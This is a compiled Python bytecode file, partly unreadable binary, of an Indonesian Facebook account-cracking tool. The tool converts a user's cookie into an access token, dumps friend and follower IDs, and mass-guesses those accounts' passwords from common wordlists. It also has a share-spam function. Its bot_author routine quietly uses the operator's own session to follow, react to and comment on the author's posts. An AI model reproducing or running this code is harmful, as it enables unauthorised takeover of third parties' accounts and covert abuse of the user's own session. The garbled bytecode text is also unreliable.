o

    �G�bt�  �                
   @   s2  d Z dZdZdZdZdZdZdee� Zdd	l	Z	dd	l
Z
dd	lZdd	lZdd	l
Z
dd	lZdd	lZdd	lZdd	lZdd	lZdd
l
mZ ddlmZ ddlmZ ddlmZ dd
l
mZ dd
l
mZ dd
l
mZ ddlmZ ddlmZ ddlmZ dZ dZ!dZ"dZ#dZ$dZ%dZ&dZ'dZ(dZ)zdd	l	Z	W n e*y�   e+e'� de!� d�� e�,d� Y nw zdd	l
Z
W n e*y�   e+e'� de!� d�� e�,d� Y nw zdd	lZ-W n e*y�   e+e'� de!� d �� e�,d!� Y nw d"Z.e
�/e$e%e(e&g�Z$d#d$� Z0e�1� Z2e2j3Z4e2j5Z6e2j7Z8d%d&d'd(d)d*d+d,d-d.d/d0d1�Z9g d2�Z:ze6dk �s#e6d3k�r&e;�  e6d4 Z<W n
 e=�y8   e;�  Y nw e:e< Z>d5e8e>e4f Z?g Z@g aAg aBdaCd6d7� ZDd8d9� ZEd:ZFd;ZGd<ZHd=ZId>ZJd?ZKd@dAiZLdBdC� ZMdDdE� ZNdFdG� ZOdHdI� ZPG dJdK� dK�ZQdLdM� ZRdNdO� ZSe
�/dPg�ZTe
�/g dQ��ZUe
�/g dR��ZVe
�/dSg�ZWdTdU� ZXdVdW� ZYdXdY� ZZdZd[� Z[d\d]� Z\d^d_� Z]ddlmZ e	�^� Z_g Z`d`da� Zadbdc� abddde� Zcdfdg� Zddhdi� Zedjdk� Zfdldm� Zgdndo� Zhdpdq� Zidrds� Zjdtdu� Zkdvdw� Zldxdy� ZKdzd{� Zmd|d}� Znd~d� Zod�d�� Zpeqd�k�re�,d�� eM�  eY�  d	S d	S )�z
ASEP YUSUPzFacebook.com/mustofa.ganteng123zInstagram.com/fi_sinagaZ081269496231z,youtube.com/channel/UCr218CW05wRLJguvi9ijRrAl   �]��k l   OL4FX z

https://www.facebook.com/�    N)�randint)�ThreadPoolExecutor)�ConnectionError)�
BeautifulSoup)�date)�datetime)�quotez[0;90mz[38;5;196mz
[38;5;46mz[38;5;226mz
[38;5;44mz[1;95mz[1;96mz[38;5;231mz[38;5;208mz[38;5;248mz[*]z! Module requests belum terinstallzpip install requestsz Module bs4 belum terinstallzpip install bs4z  Module futures belum terinstallzpip install futures�https://mbasic.facebook.comc                  C   s"   t �ttttttg�} td� d S )NaB  
  /$$$$$$   /$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$ /$$__  $$| $$_____/| $$__  $$
| $$  \ $$| $$  \__/| $$      | $$  \ $$
| $$$$$$$$|  $$$$$$ | $$$$$   | $$$$$$$/
| $$__  $$ \____  $$| $$__/   | $$____/ 
| $$  | $$ /$$  \ $$| $$      | $$      
| $$  | $$|  $$$$$$/| $$$$$$$$| $$      
|__/  |__/ \______/ |________/|__/)	�random�choice�A�K�I�J�U�H�print)Zwar_dom� r   �temp.py�banner8   s   r   �Januari�FebruariZMa7ret�April�Mei�Juni�Juli�Agustus�	September�Oktober�November�Desember)�01�02�03�04�05�06�07�08Z09Z10Z11Z12�r   r   ZMaretr   r   r   r   r   r   r   r   r    �   �   z%s-%s-%sc                   C   sv   dt j�� v rzt�d� W d S    Y d S dt j�� v r,zt�d� W d S    Y d S zt�d� W d S    Y d S )NZlinux�clear�win�cls)�sys�platform�lower�os�systemr   r   r   r   �resik^   s   r4   c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
g���Q��?)r/   �stdout�write�flush�time�sleep)�z�er   r   r   �jalanj   s
   
�r=   zhttps://business.facebook.coma  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]zILu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding�https://www.facebook.com/zhttps://m.facebook.com/�https://mbasic.facebook.com/�
user-agentz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]c                   C   s�   zt �d� W n   Y zt �d� W n   Y zt �d� W n   Y zt �d� W n   Y zt �d� W n   Y zt �d� W d S    Y d S )N�loginZCP�OK�license�login/cookie.json�login/token.json)r2   �mkdir�remover   r   r   r   �mkdir_data_loginz   s   rH   c           	   
   C   s�   z_t �� �P}|jd| d�}t|jd�}|�dddi�D ]0}dt|�v rKt�dt|j	���
d	�t�d
t|j	���
d	�dd�}d|d
  }|j||| d�}qW d   � W d S 1 sXw   Y  W d S  tyr } zW Y d }~d S d }~ww )Nz%https://mbasic.facebook.com/language/��cookies�html.parser�form�method�postzBahasa Indonesiazname="fb_dtsg" value="(.*?)"r+   zname="jazoest" value="(.*?)")�fb_dtsg�jazoest�submitr	   �action)�datarJ   )
�requests�Session�get�par�content�find_all�str�re�search�text�grouprN   �	Exception)	�cookie�xyz�reqZpra�xZbahasa�url�execr<   r   r   r   �language�   s$   
���&�� rf   c              
   C   s�   zDdt dd��� i}d|  }t�� �(}t|j||d�jd�}|jddd	�}t|d
 ��	d�d }|W  d   � W S 1 s=w   Y  W d S  t
yX } z| W  Y d }~S d }~ww )
Nr`   rD   �rr?   rI   rK   �aZLainnya��string�href�=r+   )�open�readrT   rU   rW   rV   rX   �findrZ   �splitr_   )�usernamer`   rd   ra   rb   Zkut�idr<   r   r   r   �
convert_id�   s   
(�� rs   c                 C   s�   t t� d�� t t� d�| �� t t� d�� t t� d�� t t� d�� t t� d�� t t� d�� t t� d�� t t� d	�� t t� d
�� t�  d S )Nz[+] Terjadi Kesalahan !z[+] Tidak Dapat Mengeksekusiz[+] Hal Ini Mungkin Terjadi : z[01] Cookies/Token Invalidz[02] Salah Memasukkan IDz[03] bug Pada Source Codez[04] Bug Pada Requestsz[05] Dan Lain-Lainu'   [•] Jalankan Ulang Source Code Ini : u   [•] python yuki.py)r   �P�exit)�errorr   r   r   �kecuali�   s   
rw   c                   @   s4   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� ZdS )�
bot_authorc                 C   s\   d| _ || _tt�g}g d�| _|D ]}| �||� | �d|� d�|� | �|||� qd S )Nr   )z Mantap Bang @[100006414900732:0]z"SC lu GG bang @[100006414900732:0]z0Bang mantanya icahdella ya? @[100006414900732:0]z7Semoga langgeng bang sama si Dinda @[100006414900732:0]u   Ganteng banget🥰🥰💕r?   z?v=timeline)�loop�
cookie_mentahrZ   �ASEP�komen�	get_folls�
get_likers�	get_posts)�selfr`   �tokenrz   Zlist_idrc   r   r   r   �__init__�   s    <zbot_author.__init__c                 C   s�   t �� �L}z(t|jd| |d�jd�jddd�D ]}d|d v r+|jd	|d  |d�}qW n ty? } zW Y d }~n
d }~ww W d   � d S W d   � d S 1 sSw   Y  d S )
Nzhttps://mbasic.facebook.com/%srI   rK   rh   T�rk   z
subscribe.phprk   �https://mbasic.facebook.com%s)rT   rU   rW   rV   rX   rY   r_   )r�   rr   r`   ra   rc   Z
exec_follsr<   r   r   r   r}   �   s   
("��� ��"�zbot_author.get_follsc           
      C   s  t �� �|}zXt|j||d�jd�}|jddd�D ]4}d|jv rLt�g d��}t|jd|d	  |d�jd��d�D ]}||jkrK|jd
|d	  |d�}q8q8q| �	d
|j
ddd�d	  |� W n tyo }	 zW Y d }	~	n
d }	~	ww W d   � d S W d   � d S 1 s�w   Y  d S )
NrI   rK   rh   Tr�   ZTanggapi)ZSuperZWowZPedulir�   rk   r	   zLihat Berita Lainri   )rT   rU   rW   rV   rX   rY   r]   r
   r   r~   ro   r_   )
r�   rd   r`   ra   Zbosrc   Z_react_type_r;   Zreq2r<   r   r   r   r~   �   s$   

("�"� ��
"�zbot_author.get_likersc           	      C   s  t �� �u}zQ|jd||f |d��� d D ]?}dt�| j�d|d  | �� f }t�|j	d|d ||f |d�j
�}d|v rTtd	d
��| j
� tdd
��|� tt� � qW n tyh } zW Y d }~n
d }~ww W d   � d S W d   � d S 1 s|w   Y  d S )Nz3https://graph.facebook.com/%s/posts?access_token=%srI   rS   z%s

%s%sr>   rr   zAhttps://graph.facebook.com/%s/comments?message=%s&access_token=%srv   rD   �wrE   )rT   rU   rV   �jsonr
   r   r|   �waktu�loadsrN   r]   rm   r7   rz   ru   Z"___fii___Sayang___Kamu___Widiya___r_   )	r�   rr   r`   r�   ra   rc   ZkomenorV   r<   r   r   r   r   �   s   
""$4��� ��"�zbot_author.get_postsc                 C   sv   g d�t �� jd  }ddddddd	d
�tt �� �d�� }dt �� j|t �� jf }t �� �d
�}d|||f }|S )Nr)   r+   ZMingguZSeninZSelasaZRabuZKamisZJumatZSabtu)ZSundayZMondayZTuesdayZ	WednesdayZThursdayZFridayZSaturdayz%Az%s %s %sz%Xz7

Komentar Ditulis Oleh Bot
[ Pukul %s WIB ]
- %s, %s -)r   �now�monthrZ   �strftime�day�year)r�   �_bulan_Z_hari_Zhari_iniZjamZtemr   r   r   r�   �   s   &zbot_author.waktuN)�__name__�
__module__�__qualname__r�   r}   r~   r   r�   r   r   r   r   rx   �   s    rx   c              
   C   sl   t �� �(}|jtd ttdtdddddd�	d	| id
�}t�d|j��	d�W  d   � S 1 s/w   Y  d S )
Nz/business_locationszbusiness.facebook.com�1�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	r@   �referer�host�origin�upgrade-insecure-requests�accept-language�
cache-control�accept�content-typer`   ��headersrJ   z	(EAAG\w+)r+   )
rT   rU   rV   �
url_businness�ua_business�web_fbr[   r\   r]   r^   )r`   ra   Zget_tokr   r   r   �clotox�   s    

�	�
$�r�   c               
   C   s�   t �d� t�  t�  tt� d�� tt� d�� ttt� dt� ���} z$t	| �}d| i}t
||| � tdd��|� tdd��| � t
�  W d S  tjjy^   tt� d	�� t�  Y d S  tttfyt   tt� d
�� t�  Y d S w )Nr,   z![*] Jangan gunakan akun pribadi!!z4[*] Disarankan buat akun FB baru,biar tidak mudah cpz[*] Masukan cookie : r`   rE   r�   rD   u!   [•] Tidak Ada Koneksi Internet u   [•] Cookies Invalid )r2   r3   r   rH   r   rt   rZ   �input�Br�   rx   rm   r7   �menurT   �
exceptionsr   �Mru   �KeyError�IOError�AttributeError)r`   r�   Zcokir   r   r   �
log_cookie�   s   
*.r�   zBANG MANISS KALII)zANJAY ASEP GANTENG zAlfyu Bang zBANH KOK LO JAGO BANGET SIH zLORD DAH MAKAN BLM)z'LU GANTENG BANG TAPI SAYANG KEK HENGKERzMAAF BANG GUA MAU RECODE SC LUzSOAL NYA GUA BODOH SOAL KODINGzAMPUN BANG GUA NYERAH SAJA :c               
   C   sf  z�t dd��� } dt dd��� i}t}t}t}d}tjd| d | d |  |d	� tjd
| d |  |d	� tjd
| d |  |d	� tjd
| d |  |d	� tjd
|  d |  |d	� tjd
|  d |  |d	� tjd
t d |  |d	� tjd|  |d	� tjd|  |d	� tjd|  |d	� tt	� d�� t
�  W d S  ty� } zW Y d }~d S d }~ww )
NrE   rg   r`   rD   Z3115522672004866zhttps://graph.facebook.com/z/comments/?message=z&access_token=rI   z>https://graph.facebook.com/3115522672004866/comments/?message=zLhttps://graph.facebook.com/3115522672004866/likes?summary=true&access_token=u   [•] Login Berhasil)rm   rn   �
komenredem�komtwol�kartu2drT   rN   �konr=   rt   r�   r_   )r�   r`   Zkom�komentarZpipprN   r<   r   r   r   �"___Asep___Sayang___Kamu___Dinda___  s,   "� r�   c               	   C   sp  z:t dd��� adt dd��� iat�� jdt td�} t�d��� }tt� t�	| j
�}|d }|d	 }|d
 }W n ttfyR   t
t� dt� d�� t�  Y nw t�d
� t�  tt� d�� tt� d�� tt� d�� tt� d�� tt� d�� tt� d�� tt� d�� tt� d�� tt� d�� tt� d�� tt� dt� ��}|dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |d v r�t�  d S |d!v �r,tt� d"t� d#�� tt� d$t� d%t� d&�� tt� d't� d(t� d)�� zt� d*� W n   Y t!�  d S tt� d+�� t"�  d S ),NrE   rg   r`   rD   z-https://graph.facebook.com/me?access_token=%srI   zhttp://ipinfo.io/json�namerr   �linkz[!]z cookie failed.r,   �1=================================================z%[1] Crack massal dari dump id publik z[2] Crack dari dump id publikz)[3] Crack dari dump id pertemanan sendiriz [4] Crack dari dump id followersz[5] Ganti user-agentz[6] Chek results crackz[7] Chek opsi account chekpointz[8] Sahre posting fbz[0] Log Out u   [•] Pilih Yang Mana : �r�   r!   ��2r"   ��3r#   )�4r$   )�5r%   )�6r&   )�7r'   )�8r(   ��0Z00u�   [•] Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!!z- ASEP YUSUP -uc   [•] Dengan Log Out Maka Seluruh Data Login Akan Terhapus. Berikut Adalah Data Yang Akan Dihapus :�   [•]z
Token/Cookiesu   [•][zEnter Untuk Log Out�]rA   u   [•] Isi Yang Benar !!)#rm   rn   r�   r`   rT   rU   rV   r�   rf   r�   r]   r�   r�   r=   r�   r�   r2   r3   r   r   rt   r�   r�   �massal�publik�	listteman�
followerss�userset�cek_results�	cek_hasil�kontol�shutil�rmtreeru   r�   )rV   �gtZloloZlololZlolol_idr�   Zppr   r   r   r�     sb   �









r�   c            
   	   C   s�  zt dd��� } dt dd��� i}W n ty(   tt� dt� d�� t�  Y nw ztt� d�� ttt� dt	� ���}W n   d	}Y t
|�D ]Y}|d	7 }tt� d
t	� |� dt	� ��}z/t�� j
d|| f |d
�}t�|j�}|d d D ]}|d }|d }	t�|d |	 � qvW qH ty�   tt� dt� d�� t�  Y qHw tt�dkr�tt� dt� dt� tt�� �� t�  d S tt� dt	� tt�� �� t�  d S )NrE   rg   r`   rD   r�   � cookie modar dinggo wae u-   [•] Masukan berapa id yang ingin anda cracku   [•] Masukan jumlah id : r+   u   [•] Masukan user id z : �Ihttps://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%srI   �friendsrS   rr   r�   �<=>z User id tidak di temukanr   z Maaf total id anda adalah �   [•] Total id : )rm   rn   r�   r   r�   r�   ru   �intr�   rt   �rangerT   rU   rV   r�   r�   r]   rr   �appendr�   r�   �len�fii_xd)
r�   r`   Ztanya_total�t�_id_rd   r;   �i�uid�namar   r   r   r�   Q  s8   ���*
r�   c                  C   s2  zt dd��� } dt dd��� i}W n ty(   tt� dt� d�� t�  Y nw z-t�� j	d|  |d�}t
�|j�}|d	 d
 D ]}|d }|d }t
�|d
 | � qAW n tyk   tt� d�� tj��  Y nw tt
�dkr�tt� dt� tt
�� �� t�  d S tt� dt� dt� tt
�� �� t�  d S )NrE   rg   r`   rD   r�   r�   zIhttps://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%srI   r�   rS   rr   r�   r�   u   [•] User id tidak di temukanr   r�   z Maaf total id : )rm   rn   r�   r   r�   r�   ru   rT   rU   rV   r�   r�   r]   rr   r�   r�   r2   r/   r�   r�   rt   r�   )r�   r`   rd   r;   r�   r�   r�   r   r   r   r�   m  s*   ���
*r�   c                  C   sD  zt dd��� } dt dd��� i}W n ty(   tt� dt� d�� t�  Y nw tt� dt� ��}z/t�	� j
d|| f |d	�}t�|j
�}|d
 d D ]}|d }|d
 }t�|d | � qLW n tyw   tt� dt� d�� t�  Y nw tt�dkr�tt� dt� tt�� �� t�  d S tt� dt� tt�� �� t�  d S )NrE   rg   r`   rD   r�   r�   �   [•] Masukan user id : r�   rI   r�   rS   rr   r�   r�   z4 User id tidak di temukan atau akun tersebut privat r   r�   )rm   rn   r�   r   r�   r�   ru   r�   rT   rU   rV   r�   r�   r]   rr   r�   r�   r�   r�   rt   r�   )r�   r`   r�   rd   r;   r�   r�   r�   r   r   r   r�   �  s,   ���
$r�   c            
      C   sL  zt dd��� } dt dd��� i}W n ty%   tt� d�� t�  Y nw tt� dt� ��}z'|�� jd|| f |d��	� d	 D ]}|d
 }|d }t
�|d | � qAW n tyl   tt� d
t
� d�� t�  Y nw tt
�dkr�tt� dt� tt
�� �� t�  ntt� dt
� dt
� tt
�� �� dd l}dd l}dd l}dd l	}	d S )NrE   rg   r`   rD   u   [•] cookie modar dinggo wae r�   zEhttps://graph.facebook.com/%s/subscribers?limit=20000&access_token=%srI   rS   rr   r�   r�   r�   z3 User id tidak di temukan atau id terdsebut privat r   r�   u   [•] z total id : )rm   rn   r�   r   r�   ru   r�   rU   rV   r�   rr   r�   r�   r�   r�   r�   r�   r2   r[   rT   )
r�   r`   r�   rT   r�   r�   r�   r2   r[   r�   r   r   r   r�   �  s*   �&�� $r�   c                  C   s4   t d� t d� td�} | dv rt�  d S t�  d S )Nz1. Spam share via tokenz.2. Spam share via token dan cookie Di Sarankanz
 Pilih : )r�   )r   r�   r�   �token_cookie)Zaskr   r   r   r�   �  s   

r�   c                  C   s�   t d� td�} td�}ttd��}t d� t d� t�d� z:dd	d
dd�}t|�D ]+}tjd
|� d| � �|d�j}t	�
|�}d|v rRt d|d � �� t d� q+td� q+W d S    td� Y d S )Nz token EAAG� Masukan token : � Masukan link : zMasukan limit : � follow FB gw anjingr�   �Pxdg-open https://www.facebook.com/mustofa.ganteng123?text=Hallo%20Bang%20Ganteng�graph.facebook.comr�   �?0�~Mozilla/5.0 (Linux; Android 9; Infinix X653C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36�Z	authorityr�   zsec-ch-ua-mobiler@   �.https://graph.facebook.com/v13.0/me/feed?link=�&published=0&access_token=�r�   rr   � Berhasil membagikan �- Gagal membagikan, kemungkinan token invalid�r   r�   r�   r2   r3   r�   �sesrN   r]   r�   r�   ru   )r�   �idt�limit�headerrc   rN   rS   r   r   r   r�   �  s&   



�r�   c                  C   s�   t d� td�} t d� td�}td�}ttd��}t d� t d� t�d	� z=d
ddd
d�}t|�D ].}tjd|� d|� �|d| id�j}t	�
|�}d|v r]t d|d � �� t d� q3td� q3W d S    td� Y d S )Nz cokiess bebasz Masukan cookie : z Pake token EAAGr�   r�   z Masukan limit : r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r`   r�   rr   r�   r�   r�   )r`   r�   r�   r�   r�   rc   rN   rS   r   r   r   r�   �  s*   
"


�r�   c               
   C   st  t t� d�� t t� d�� t t� d�� tt� dt� ��} | dv r|tt� dt� dt� ��}ztdd	��|� tdd
��� }W n ty\ } zt t� dt� |� �� W Y d }~nd }~ww ||krmt t� d�� t	�  d S t t� d
t� d�� t
�  d S | dv r�z	tdd
��� }W n ty�   d}Y nw t t� dt� |� �� t	�  d S | dv r�t	�  d S t t� d�� t
�  d S )Nz[1] Ganti user agentz"[2] Cek user agent yang di gunakanz[0] Kembaliu   [•] Input : r�   u   [•] Masukan user agent 
u   [•] Masukan di sini : �uar�   rg   u
   [•] Eror : u   [•] Sukses menggantir�   z Gagal mengganti user agent r�   �jMozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110u   [•] User agent : r�   u   [•] Pilihan salah )r   r�   r�   rt   rm   r7   rn   r_   r�   r�   ru   r�   )Z_pil_ZlololrZuserar<   Z_tes_uar   r   r   r�   �  s4   "��� 
r�   c                 C   sx  d}t �� }|j�dddtd|dddd	d
dtd d
dd�� i }t|jtd d|id�jd�}|�dddi�}g d�}|�	d�D ]}|�d�|v rW|�|�d�|�d�i� q@q@|�| |d�� zt|j
t|�d� |dd�jd�}	W n t jjy�   t
t� d�� Y nw d|jv r�t
t� d t� d!�� d S d"|jv �r|	�d�}
|
�ddd#i�d }|
�ddd$i�d }|
�ddd%i�d }
||||d&d'|
d(�}t|j
t|
d  |d)�jd�}d*d+� |�	d,�D �}tt|��D ]#}tt� d-t� t|d. �� t� d/t� d0t� d-t� || � t� d/�� q�d S d1t|	�v �r0|	�d2d3d1i��d2�j}t
t� d t� d4|� �� d S t
t� d t� d5�� d S )6Nr�   �mbasic.facebook.comr�   r�   �!application/x-www-form-urlencoded�|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�navigate�?1�document�/login/?next&ref=dbl&fl&refid=8�
gzip, deflater�   ��Hostr�   r�   r�   r�   r@   r�   zx-requested-withzsec-fetch-sitezsec-fetch-modezsec-fetch-userzsec-fetch-destr�   �accept-encodingr�   r@   r�   rK   rL   rM   rN   ��lsdrP   �m_ts�li�
try_number�unrecognized_triesrA   Zbi_xrwhr�   r�   �value��email�passrR   T�rS   Zallow_redirectsu   [•] Akun terkena spam�c_userr�   z Akun berhasil di login�
checkpointrO   rP   �nh� �	Lanjutkan�rO   rO   rP   rP   Zcheckpoint_datazsubmit[Continue]r  �rS   c                 S   �   g | ]}|j �qS r   �r]   ��.0Zyyr   r   r   �
<listcomp>4  �    zlog_hasil.<locals>.<listcomp>�option�[r+   r�   z--->�login_errorZdivrr   z>>>> z' Akun tersebut sandi nya telah di ganti)rT   rU   r�   �updater�   rW   rV   r]   ro   rY   rN   r�   ZTooManyRedirectsr   r�   rJ   r�   r   r�   r�   r=   r   rZ   rt   �kr
   )�userZpaswr�   r�   rS   �ged�fm�listr�   �runrL   �dtsg�jzstr  �dataD�tempek�ngew�optZohr   r   r   �	log_hasil  sr   �&�

�	D�r)  c               	   C   s2  t t� d�� t t� dt� dt� d�� tt� dt� ��} z	t| d��� }W n tyD   t t� dt� d�� t�  t	�
d	� t�  Y nw t t� d
t� t
t|��� �� |D ]3}|�dd�}|�d
�}t t� dt� |� �� zt|d |d � W n tjjy�   Y qVw t d� qVtt� dt� d�� t�  d S )Nu   [•] Masukan file cp u"   [•] Contoh untuk masukan file : �CP/z.jsonu   [•] Masukan nama file : rg   r�   z File tidak di temukan�   u   [•] Total akun chekpoint : r5   r  �|u   [•] Akun facebook : r   r+   z Chek akun sudah selesai)r   r�   �tanggalr�   rm   �	readlines�FileNotFoundErrorr�   ru   r9   r:   r�   rt   rZ   r�   �replacerp   r)  rT   r�   r   r   r�   )�filesZ	buka_bajuZmemekr�   Ztitidr   r   r   r�   <  s,   �
�

r�   c                  C   s�  zt dt � W n ty   t�dt � Y nw zt dt � W n ty1   t�dt � Y nw dt } dt }t | d��� }t |d��� }tt� d�� tt� d�� tt� d�� tt� d	t	� ��}|d
v r�t
|�dkr�tt� dt� d
t	� �� t�dt � d S tt� d�� d S |dv r�t
|�dkr�tt� dt� d�� t�dt � d S tdt� dt� d�� d S |dv r�t
�  d S tt� dt� d�� d S )N�
OK/%s.jsonztouch OK/%s.json�
CP/%s.jsonztouch CP/%s.jsonrg   z[1] Cek results cpz[2] Cek results okz[0] Back�   [•] Pilih : r�   r   r�   z Results cpzcat CP/%s.jsonu   [•] Tidak ada hasilr�   z Results okzcat OK/%s.jsonr5   z Tidak ada hasilr�   z Pilian tidak ada)rm   r-  r�   r2   r3   rn   r   r�   r�   rt   r�   r�   r   r�   )�cp�okZhsl_cpZhsl_okZ_pil3hr   r   r   r�   R  s>   ��
r�   c               	   C   s�  t �  tt� dt� ��} | dv rtt� dt� d�� t�  d S | dv �r�tt� dt� d�� tt� dt� d�� tt� dt� ��}|d	v �r��z1d
}d
}||v �rctt� dt� d�� tt� dt� ��}|d
v r�tdd��G}tt� dt� d�� tt� dt� ���	d�}t
|�dkr�tt� dt� d�� t�  t�  tD ]}|�	d�\}}	|�
t||� q�W d   � n1 s�w   Y  t�  n�|dv �rbtdd���}t�  tD ]~}|�	d�\}}	|	�	d�}
t
|
�dkr�|	|
d |
d d |
d d |
d d |
d d g}nHt
|
�dk�r!|	|
d |
d d |
d d |
d d |
d d g}n&t
|
�d k�rC|	|
d |
d d |
d d |
d d |
d d g}ng d!�}|�
t||� q�W d   � n	1 �sZw   Y  t�  ntt� dt� d"�� t�  W d S W d S W d S  ttf�y�   tt� dt� d"�� t�  Y d S w tt� dt� d�� tt� dt� ��}|d
v �rtdd��F}tt� dt� d�� tt� dt� ���	d�}t
|�dk�r�tt� dt� d�� t�  tD ]}|�	d�\}}	|�
t||� �q�W d   � n	1 �s�w   Y  t�  d S |dv �r�tdd���}t�  tD ]�}|�	d�\}}	|	�	d�}
t
|
�dk�rD|	|
d |
d d |
d d |
d d |
d d g}nHt
|
�dk�rf|	|
d |
d d |
d d |
d d |
d d g}n&t
|
�d k�r�|	|
d |
d d |
d d |
d d |
d d g}ng d!�}|�
t||� �qW d   � n	1 �s�w   Y  t�  d S d S | d#v �r9tt� d$t� d%�� tt� dt� d�� tt� dt� ��}|d	v �r�z3d&}d&}||v �r�tt� dt� d�� tt� dt� ��}|d
v �rRtdd��J}tt� dt� d�� tt� dt� d���	d�}t
|�dk�r'tt� dt� d'�� t�  t�  tD ]}|�	d�\}}	|�
t||� �q,W d   � n	1 �sIw   Y  t�  n�|dv �r�tdd���}t�  tD ]�}|�	d�\}}	|	�	d�}
t
|
�dk�r�|	|
d |
d d |
d d |
d d |
d d g}nHt
|
�dk�r�|	|
d |
d d |
d d |
d d |
d d g}n&t
|
�d k�r�|	|
d |
d d |
d d |
d d |
d d g}ng d!�}|�
t||� �qbW d   � n	1 �s�w   Y  t�  nt|� � t�  W d S W d S W d S  ttf�y   t|� � t�  Y d S w tt� d(t� d�� tt� dt� ��}|d
v �r�tdd��I}tt� d)t� d*�� tt� dt� ���	d�}t
|�dk�rett� dt� d�� t�  t�  tD ]}|�	d�\}}	|�
t||� �qjW d   � n	1 �s�w   Y  t�  d S |dv �r7tdd���}t�  tD ]�}|�	d�\}}	|	�	d�}
t
|
�dk�r�|	|
d |
d d |
d d |
d d |
d d g}nHt
|
�dk�r�|	|
d |
d d |
d d |
d d |
d d g}n&t
|
�d k�r|	|
d |
d d |
d d |
d d |
d d g}ng d!�}|�
t||� �q�W d   � n	1 �s-w   Y  t�  d S d S | d+v �r�tt� d$t� d%�� tt� dt� d�� tt� dt� ��}|d	v �r��z3d&}d&}||v �r�tt� dt� d�� tt� dt� ��}|d
v �r�tdd��J}tt� dt� d�� tt� dt� d���	d�}t
|�dk�r�tt� dt� d'�� t�  t�  tD ]}|�	d�\}}	|�
t||� �q�W d   � n	1 �s�w   Y  t�  n�|dv �r�tdd���}t�  tD ]�}|�	d�\}}	|	�	d�}
t
|
�dk�r|	|
d |
d d |
d d |
d d |
d d g}nHt
|
�dk�rA|	|
d |
d d |
d d |
d d |
d d g}n&t
|
�d k�rc|	|
d |
d d |
d d |
d d |
d d g}ng d!�}|�
t||� �q�W d   � n	1 �s{w   Y  t�  nt|� � t�  W d S W d S W d S  ttf�y�   t|� � t�  Y d S w tt� d(t� d�� tt� dt� ��}|d
v �rtdd��I}tt� d)t� d*�� tt� dt� ���	d�}t
|�dk�r�tt� dt� d�� t�  t�  tD ]}|�	d�\}}	|�
t||� �q�W d   � n	1 �sw   Y  t�  d S |dv �r�tdd���}t�  tD ]�}|�	d�\}}	|	�	d�}
t
|
�dk�r^|	|
d |
d d |
d d |
d d |
d d g}nHt
|
�dk�r�|	|
d |
d d |
d d |
d d |
d d g}n&t
|
�d k�r�|	|
d |
d d |
d d |
d d |
d d g}ng d!�}|�
t||� �q.W d   � n	1 �s�w   Y  t�  d S d S d S ),Nr4  )r  r�   z Pilihan tidak boleh kosongr�   u(   [•] Tampilan kan opsi akun chek point zY/tz6 Terkadang jika menampilkan opsi jarang dapet akun !!!)�y�YZanjinku0   [•] Crack menggunakan password manual/default zM/D)�mr�   �   )�max_workersu   [•] Contoh password : zsayang,anjing,kontolu   [•] Buat sandi : �,r  z Sandi tidak boleh kosongr�   )�d�D� �   r   Z321Z123Z12345Z123456r+  �   )Z	bissmilahZanjingZ	indonesiaZ
sayangkamuz Erorr�   u   [•] Tampilkan opsi chekpoint zY/TZAnjinkz  Sandi tidak boleh kosong anjinku0   [•] Crack menggunakan pasword manual/defaults u   [•] Contoh password zAnjink,kontol,sayangr�   )�koner�   rt   r�   r   r�   ru   r=   r   rp   r�   �startedrr   rQ   �apir�   r�   �apiiii�mbasic�mobil�mbasicc�mobill)ZfiisayangwidiyaZ_checkoptions_Z_key�keyZterZcoegZasur  r�   r�   Zfrist�fiir   r   r   r�   r  s�  


��	

666���&�4
��
	

666��
�



��	

666����*
��
	

666��
�



��	

666����*
��
	

666��
�7r�   c                   C   s@   t t� dt� d�� t t� dt� d�� t t� dt� d�� d S )Nz[1] B-api > zSANGAT CEPETz
[2] Mbasic > ZKALEMz
[3] Mobile > zSANGAT KALEM)r   r�   rt   r   r   r   r   rB  P  s   rB  c                   C   sx   t t� dt� dt� dt� dt� dt� �� t t� dt� dt� dt� dt� dt� �� t t� d�� t t� d	t� �� d S )
Nr�   z	 Results zOK z
tersimpan di zOK/zCP r*  u/   [•] Jika tidak hasil pindahkan kartu SIM dulur�   )r   r�   rt   r   r-  r
   r   r   r   r   rC  U  s   **rC  c                 C   s�  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt
� d	t
� t	t�� �� tj��  |D �]}|�� }tt�d
d��tt�dd
��tt�dd
